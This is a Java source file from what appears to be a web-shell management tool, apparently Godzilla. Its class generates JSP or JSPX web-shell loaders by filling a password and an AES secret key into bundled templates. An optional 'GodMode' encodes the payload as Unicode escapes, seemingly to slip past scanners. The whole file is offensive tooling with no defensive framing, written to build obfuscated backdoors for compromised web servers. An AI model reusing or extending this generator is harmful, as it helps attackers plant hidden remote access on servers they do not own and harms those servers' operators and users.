package shells.cryptions.JavaAes;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import java.awt.Component;
import java.io.InputStream;
import javax.swing.Icon;
import util.Log;
import util.functions;

class Generate {
   private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

   public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
      byte[] data = null;

      try {
         InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "GlobalCode.bin");
         String globalCode = new String(functions.readInputStream(inputStream));
         inputStream.close();
         globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
         inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw" : "base64") + "Code.bin");
         String code = new String(functions.readInputStream(inputStream));
         inputStream.close();
         Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
         if (selectedValue != null) {
            String suffix = (String)selectedValue;
            inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
            String template = new String(functions.readInputStream(inputStream));
            inputStream.close();
            if (suffix.equals(SUFFIX[1])) {
               globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
               code = code.replace("<", "&lt;").replace(">", "&gt;");
            }

            if (ApplicationContext.isGodMode()) {
               template = template.replace("{globalCode}", functions.stringToUnicode(globalCode)).replace("{code}", functions.stringToUnicode(code));
            } else {
               template = template.replace("{globalCode}", globalCode).replace("{code}", code);
            }

            data = template.getBytes();
         }
      } catch (Exception var11) {
         Log.error((Throwable)var11);
      }

      return data;
   }

   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
      return GenerateShellLoder("", pass, secretKey, isBin);
   }
}
